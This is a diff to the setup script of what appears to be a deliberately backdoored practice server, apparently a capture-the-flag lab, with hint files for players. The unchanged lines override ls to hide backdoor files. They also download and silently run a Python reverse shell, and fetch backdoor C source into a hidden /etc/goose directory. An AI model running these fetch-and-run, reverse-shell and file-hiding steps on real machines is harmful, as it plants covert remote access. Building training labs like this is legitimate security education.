@@ -118,14 +118,14 @@ ls() { command ls --color=auto "$@" | grep -vE "back\.(sh|py)$|golden_egg$"; }
 EOF
 
 # Add a Python Reverse Shell
-curl -s -o /root/back.py https://raw.githubusercontent.com/infiniteaxon/VulnServer/main/back.py
+curl -s -o /root/back.py https://raw.githubusercontent.com/infiniteaxon/VulnServer/refs/heads/main/back.py
 python3 /root/back.py </dev/null >/dev/null 2>&1 &
 
 ### Install and schedule a Backdoor Binary
 # Get the code to compile
 mkdir -p /etc/goose
 mkdir -p /etc/goose/.golden_egg
-curl -s -o /etc/goose/golden_egg.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/main/backdoor.c
+curl -s -o /etc/goose/golden_egg.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/refs/heads/main/backdoor.c
 
 # Hint
 echo "You're in the correct directory!" > /etc/goose/egg
